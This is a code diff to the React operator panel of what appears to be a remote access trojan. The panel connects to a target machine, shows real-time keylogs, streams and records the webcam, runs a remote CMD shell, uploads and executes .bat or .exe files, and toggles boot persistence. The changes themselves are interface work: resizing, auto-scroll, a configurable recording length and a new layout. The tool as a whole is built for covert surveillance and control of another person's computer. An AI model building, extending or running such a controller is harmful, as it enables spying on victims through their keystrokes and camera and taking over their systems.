@@ -48,17 +48,113 @@ const App = () => {
   const [cmdShowWindow, setCmdShowWindow] = useState(false);
   const [uploadedFile, setUploadedFile] = useState(null);
   
+  // Recording timer ref
+  const recordingTimerRef = React.useRef(null);
+  const [recordingStarted, setRecordingStarted] = useState(false);
+  const [recordDuration, setRecordDuration] = useState(10);
+  
   // Persistence state
   const [persistenceEnabled, setPersistenceEnabled] = useState(false);
+  
+  // Resize state
+  const [logsPanelWidth, setLogsPanelWidth] = useState(420);
 
   // Load saved connection info from localStorage
   useEffect(() => {
     const savedIP = localStorage.getItem('targetIP');
     const savedPort = localStorage.getItem('wsPort');
+    const savedWidth = localStorage.getItem('logsPanelWidth');
     
     if (savedIP) setTargetIP(savedIP);
     if (savedPort) setWsPort(savedPort);
+    if (savedWidth) setLogsPanelWidth(parseInt(savedWidth));
   }, []);
+  
+  // Handle panel resize
+  useEffect(() => {
+    let isResizing = false;
+    let startX = 0;
+    let startWidth = 0;
+
+    const handleMouseDown = (e) => {
+      const resizeHandle = e.target.closest('.resize-handle');
+      if (!resizeHandle) return;
+      
+      isResizing = true;
+      startX = e.clientX;
+      startWidth = logsPanelWidth;
+      
+      document.body.style.cursor = 'col-resize';
+      document.body.style.userSelect = 'none';
+      e.preventDefault();
+    };
+
+    const handleMouseMove = (e) => {
+      if (!isResizing) return;
+      e.preventDefault();
+      
+      const diff = startX - e.clientX;
+      const newWidth = Math.max(300, Math.min(800, startWidth + diff));
+      setLogsPanelWidth(newWidth);
+    };
+
+    const handleMouseUp = (e) => {
+      if (isResizing) {
+        isResizing = false;
+        document.body.style.cursor = '';
+        document.body.style.userSelect = '';
+        e.preventDefault();
+      }
+    };
+
+    document.addEventListener('mousedown', handleMouseDown);
+    document.addEventListener('mousemove', handleMouseMove);
+    document.addEventListener('mouseup', handleMouseUp);
+
+    return () => {
+      document.removeEventListener('mousedown', handleMouseDown);
+      document.removeEventListener('mousemove', handleMouseMove);
+      document.removeEventListener('mouseup', handleMouseUp);
+    };
+  }, []);
+  
+  // Save width to localStorage when it changes
+  useEffect(() => {
+    localStorage.setItem('logsPanelWidth', logsPanelWidth.toString());
+  }, [logsPanelWidth]);
+
+  // Start countdown when recording starts and camera becomes ready
+  useEffect(() => {
+    if (recordingStarted && isRecording) {
+      // Clear any existing timer first
+      if (recordingTimerRef.current) {
+        clearInterval(recordingTimerRef.current);
+      }
+      
+      addLog(`📹 Camera ready, starting ${recordDuration}-second countdown...`, 'success');
+      
+      let countdown = recordDuration;
+      setRecordCountdown(countdown);
+      
+      recordingTimerRef.current = setInterval(() => {
+        countdown--;
+        setRecordCountdown(countdown);
+        
+        if (countdown <= 0) {
+          clearInterval(recordingTimerRef.current);
+          recordingTimerRef.current = null;
+        }
+      }, 1000);
+      
+      // Cleanup on unmount or when dependencies change
+      return () => {
+        if (recordingTimerRef.current) {
+          clearInterval(recordingTimerRef.current);
+          recordingTimerRef.current = null;
+        }
+      };
+    }
+  }, [recordingStarted, isRecording, recordDuration]);
 
   // Custom Alert/Confirm functions
   const showAlert = (title, message) => {
@@ -96,6 +192,13 @@ const App = () => {
   const addLog = (message, type = 'info') => {
     const timestamp = new Date().toLocaleTimeString();
     setLogs(prev => [...prev, { timestamp, message, type }]);
+    // Auto-scroll logs
+    setTimeout(() => {
+      const logsContainer = document.querySelector('.logs-content');
+      if (logsContainer) {
+        logsContainer.scrollTop = logsContainer.scrollHeight;
+      }
+    }, 100);
   };
 
   // Auto-detect server IP on local network
@@ -191,6 +294,13 @@ const App = () => {
           else if (data.type === 'KEYLOG_REALTIME') {
             // Real-time keylog data
             setRealtimeKeylog(prev => prev + data.data);
+            // Auto-scroll keylog
+            setTimeout(() => {
+              const keylogRaw = document.querySelector('.keylog-output.raw');
+              const keylogReadable = document.querySelector('.keylog-output.readable');
+              if (keylogRaw) keylogRaw.scrollTop = keylogRaw.scrollHeight;
+              if (keylogReadable) keylogReadable.scrollTop = keylogReadable.scrollHeight;
+            }, 100);
           }
           else if (data.type === 'SERVER_INFO') {
             // Auto-detected server IP
@@ -202,6 +312,13 @@ const App = () => {
           else if (data.type === 'CMD_OUTPUT') {
             // Real-time CMD output
             setCmdOutput(prev => prev + data.data);
+            // Auto-scroll terminal output
+            setTimeout(() => {
+              const terminalContent = document.querySelector('.terminal-content');
+              if (terminalContent) {
+                terminalContent.scrollTop = terminalContent.scrollHeight;
+              }
+            }, 100);
           }
           else if (data.type === 'CMD_STATUS') {
             setCmdRunning(data.running);
@@ -219,10 +336,29 @@ const App = () => {
           }
           else if (data.type === 'CAM_FRAME') {
             setWebcamFrame(data.data);
-            addLog('Webcam frame updated', 'info');
+            
+            // FALLBACK: If server doesn't support CAM_READY, use first frame as signal
+            if (!isRecording) {
+              addLog('Webcam frame updated', 'info');
+            } else if (!recordingStarted) {
+              // Trigger countdown start via state update
+              setRecordingStarted(true);
+            }
+          }
+          else if (data.type === 'CAM_READY') {
+            // Camera is ready, start countdown (PREFERRED METHOD)
+            addLog('📹 Received CAM_READY signal from server', 'success');
+            setRecordingStarted(true);
           }
           else if (data.type === 'RECORD_RESULT') {
+            // Clean up timer
+            if (recordingTimerRef.current) {
+              clearInterval(recordingTimerRef.current);
+              recordingTimerRef.current = null;
+            }
+            
             setIsRecording(false);
+            setRecordingStarted(false);
             setRecordCountdown(0);
             setIsConverting(true);
             addLog('Converting AVI video to MP4...', 'info');
@@ -274,11 +410,18 @@ const App = () => {
       };
 
       websocket.onclose = () => {
+      // Clean up timer
+      if (recordingTimerRef.current) {
+        clearInterval(recordingTimerRef.current);
+        recordingTimerRef.current = null;
+      }
+      
       setIsConnected(false);
       setIsLoggedIn(false);
       setIsStreaming(false);
       setWebcamFrame(null);
       setIsRecording(false);
+      setRecordingStarted(false);
       setRecordCountdown(0);
       setIsConverting(false);
       addLog('Disconnected', 'warning');
@@ -291,6 +434,12 @@ const App = () => {
   // Ngắt kết nối
   const handleDisconnect = () => {
     if (ws) {
+      // Clean up timer
+      if (recordingTimerRef.current) {
+        clearInterval(recordingTimerRef.current);
+        recordingTimerRef.current = null;
+      }
+      
       ws.close();
       setWs(null);
       setIsConnected(false);
@@ -300,6 +449,7 @@ const App = () => {
       setScreenshotData(null);
       setRecordingData(null);
       setIsRecording(false);
+      setRecordingStarted(false);
       setRecordCountdown(0);
       setIsConverting(false);
       addLog('Disconnected', 'info');
@@ -412,6 +562,13 @@ const App = () => {
     sendCommand('CMD_EXEC', { command: cmdInput });
     setCmdOutput(prev => prev + `> ${cmdInput}\n`);
     setCmdInput('');
+    // Auto-scroll terminal output
+    setTimeout(() => {
+      const terminalContent = document.querySelector('.terminal-content');
+      if (terminalContent) {
+        terminalContent.scrollTop = terminalContent.scrollHeight;
+      }
+    }, 100);
   };
 
   const handleClearCmdOutput = () => {
@@ -603,21 +760,22 @@ const App = () => {
       return;
     }
     
-    setIsRecording(true);
-    setRecordCountdown(10);
-    sendCommand('RECORD_CAM');
-    addLog('Recording for 10 seconds...', 'info');
+    if (recordDuration < 1 || recordDuration > 60) {
+      showAlert('⚠️ Invalid Duration', 'Duration must be between 1 and 60 seconds!');
+      return;
+    }
     
-    // Countdown timer
-    let countdown = 10;
-    const timer = setInterval(() => {
-      countdown--;
-      setRecordCountdown(countdown);
-      
-      if (countdown <= 0) {
-        clearInterval(timer);
-      }
-    }, 1000);
+    // Clear any existing timer
+    if (recordingTimerRef.current) {
+      clearInterval(recordingTimerRef.current);
+      recordingTimerRef.current = null;
+    }
+    
+    setIsRecording(true);
+    setRecordingStarted(false);
+    setRecordCountdown(recordDuration);
+    sendCommand('RECORD_CAM', { duration: recordDuration });
+    addLog('Starting camera for recording...', 'info');
   };
 
   return (
@@ -704,7 +862,8 @@ const App = () => {
                 disabled={!isConnected}
                 title={persistenceEnabled ? "Disable auto-start" : "Enable auto-start on system boot"}
               >
-                {persistenceEnabled ? '🔒 Persist ON' : '🔓 Persist OFF'}
+                {persistenceEnabled ? '🔒' : '🔓'}
+                <span className="btn-text">{persistenceEnabled ? ' Persist ON' : ' Persist OFF'}</span>
               </button>
               <button 
                 onClick={handleKillServer} 
@@ -712,7 +871,7 @@ const App = () => {
                 disabled={!isConnected}
                 title="Terminate server process"
               >
-                ⛔ Kill Server
+                ⛔<span className="btn-text"> Kill Server</span>
               </button>
               <div className="connection-info">
                 <span className="connection-badge">
@@ -721,7 +880,7 @@ const App = () => {
                 </span>
               </div>
               <button onClick={handleDisconnect} className="btn btn-logout">
-                Logout
+                🚪<span className="btn-text"> Logout</span>
               </button>
             </div>
           </header>
@@ -984,20 +1143,34 @@ const App = () => {
                 {/* Recording Section */}
                 <div className="section-group">
                   <h4>🎥 Webcam Recording</h4>
-                  <button 
-                    onClick={handleStartRecording}
-                    className="btn btn-command"
-                    disabled={!isConnected || isStreaming || isRecording}
-                  >
-                    {isRecording ? `🎬 Recording... (${recordCountdown}s)` : '🎬 Record 10 seconds'}
-                  </button>
+                  <div className="recording-controls">
+                    <div className="duration-input-group">
+                      <label>Duration (seconds):</label>
+                      <input
+                        type="number"
+                        min="1"
+                        max="60"
+                        value={recordDuration}
+                        onChange={(e) => setRecordDuration(parseInt(e.target.value) || 10)}
+                        disabled={isRecording}
+                        className="duration-input"
+                      />
+                    </div>
+                    <button 
+                      onClick={handleStartRecording}
+                      className="btn btn-command"
+                      disabled={!isConnected || isStreaming || isRecording}
+                    >
+                      {isRecording ? `🎬 Recording... (${recordCountdown}s)` : `🎬 Record ${recordDuration}s`}
+                    </button>
+                  </div>
                   
                   {isRecording && (
                     <div className="recording-progress">
                       <div className="progress-bar">
                         <div 
                           className="progress-fill" 
-                          style={{width: `${((10 - recordCountdown) / 10) * 100}%`}}
+                          style={{width: `${((recordDuration - recordCountdown) / recordDuration) * 100}%`}}
                         ></div>
                       </div>
                       <p className="recording-text">
@@ -1017,8 +1190,12 @@ const App = () => {
                   
                   {recordingData && !isRecording && !isConverting && (
                     <div className="media-preview">
+                      <h4>📹 Recorded Video Preview</h4>
                       <video 
                         controls 
+                        autoPlay
+                        muted
+                        loop
                         className="preview-video"
                         key={recordingData}
                       >
@@ -1034,9 +1211,9 @@ const App = () => {
                         </button>
                         <button 
                           onClick={() => setRecordingData(null)} 
-                          className="btn btn-small"
+                          className="btn btn-danger"
                         >
-                          ✖ Close
+                          🗑️ Delete
                         </button>
                       </div>
                     </div>
@@ -1111,24 +1288,49 @@ const App = () => {
 
             {activeTab === 'terminal' && (
               <div className="command-section">
-                <h3>💻 CMD Terminal</h3>
-                
-                {/* Control Panel */}
+                <div style={{display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '20px'}}>
+                  <h3 style={{margin: 0}}>💻 CMD Terminal</h3>
+                  <label className="checkbox-label" title="Show windows when running CMD session or executing uploaded files" style={{margin: 0}}>
+                    <input
+                      type="checkbox"
+                      checked={cmdShowWindow}
+                      onChange={(e) => setCmdShowWindow(e.target.checked)}
+                      disabled={cmdRunning}
+                    />
+                    <span>Show Terminal Window</span>
+                  </label>
+                </div>
+
+                {/* File Upload Section */}
+                <div className="file-upload-section">
+                  <h4>📁 Run .bat or .exe File</h4>
+                  <div className="upload-controls">
+                    <input
+                      type="file"
+                      accept=".bat,.exe,.cmd"
+                      onChange={handleFileUpload}
+                      id="file-upload"
+                      className="file-input"
+                    />
+                    <label htmlFor="file-upload" className="btn btn-upload">
+                      📤 Choose File
+                    </label>
+                    {uploadedFile && (
+                      <span className="file-name">✅ {uploadedFile.name}</span>
+                    )}
+                    <button 
+                      onClick={handleRunUploadedFile} 
+                      className="btn btn-execute"
+                      disabled={!uploadedFile || !isConnected}
+                    >
+                      🚀 Execute File
+                    </button>
+                  </div>
+                </div>
+
+                {/* Terminal Controls */}
                 <div className="terminal-controls">
                   <div className="control-row">
-                    <label className="checkbox-label" title="Show windows when running CMD session or executing uploaded files">
-                      <input
-                        type="checkbox"
-                        checked={cmdShowWindow}
-                        onChange={(e) => setCmdShowWindow(e.target.checked)}
-                        disabled={cmdRunning}
-                      />
-                      <span>Show Terminal Window</span>
-                      <small style={{marginLeft: '8px', color: '#888'}}>
-                        (applies to CMD session & uploaded files)
-                      </small>
-                    </label>
-                    
                     <div className="status-badge">
                       Status: <span className={cmdRunning ? 'status-running' : 'status-stopped'}>
                         {cmdRunning ? '🟢 Running' : '🔴 Stopped'}
@@ -1165,33 +1367,30 @@ const App = () => {
                       🧹 Clear Output
                     </button>
                   </div>
-                </div>
 
-                {/* File Upload Section */}
-                <div className="file-upload-section">
-                  <h4>📁 Run .bat or .exe File</h4>
-                  <div className="upload-controls">
-                    <input
-                      type="file"
-                      accept=".bat,.exe,.cmd"
-                      onChange={handleFileUpload}
-                      id="file-upload"
-                      className="file-input"
-                    />
-                    <label htmlFor="file-upload" className="btn btn-upload">
-                      📤 Choose File
-                    </label>
-                    {uploadedFile && (
-                      <span className="file-name">✅ {uploadedFile.name}</span>
-                    )}
-                    <button 
-                      onClick={handleRunUploadedFile} 
-                      className="btn btn-execute"
-                      disabled={!uploadedFile || !isConnected}
-                    >
-                      🚀 Execute File
-                    </button>
-                  </div>
+                  {/* Command Input */}
+                  {cmdRunning && (
+                    <div className="terminal-input-section" style={{marginTop: '16px'}}>
+                      <h4>⌨️ Execute Command</h4>
+                      <div className="input-group">
+                        <input
+                          type="text"
+                          value={cmdInput}
+                          onChange={(e) => setCmdInput(e.target.value)}
+                          onKeyPress={(e) => e.key === 'Enter' && handleSendCommand()}
+                          placeholder="Enter command (e.g., dir, ipconfig, ping google.com)"
+                          className="terminal-input"
+                        />
+                        <button 
+                          onClick={handleSendCommand} 
+                          className="btn btn-send"
+                          disabled={!cmdInput.trim()}
+                        >
+                          📤 Send
+                        </button>
+                      </div>
+                    </div>
+                  )}
                 </div>
 
                 {/* Terminal Output */}
@@ -1201,37 +1400,16 @@ const App = () => {
                     <pre>{cmdOutput || 'No output yet. Start a session or run a command...'}</pre>
                   </div>
                 </div>
-
-                {/* Command Input */}
-                {cmdRunning && (
-                  <div className="terminal-input-section">
-                    <h4>⌨️ Execute Command</h4>
-                    <div className="input-group">
-                      <input
-                        type="text"
-                        value={cmdInput}
-                        onChange={(e) => setCmdInput(e.target.value)}
-                        onKeyPress={(e) => e.key === 'Enter' && handleSendCommand()}
-                        placeholder="Enter command (e.g., dir, ipconfig, ping google.com)"
-                        className="terminal-input"
-                      />
-                      <button 
-                        onClick={handleSendCommand} 
-                        className="btn btn-send"
-                        disabled={!cmdInput.trim()}
-                      >
-                        📤 Send
-                      </button>
-                    </div>
-                  </div>
-                )}
               </div>
             )}
           </div>
         </div>
 
+        {/* Resize Handle */}
+        <div className="resize-handle"></div>
+
         {/* Logs Panel */}
-        <div className="logs-panel">
+        <div className="logs-panel" style={{ width: `${logsPanelWidth}px` }}>
           <div className="logs-header">
             <h3>📝 System Logs</h3>
             <button onClick={clearLogs} className="btn btn-small">Clear</button>
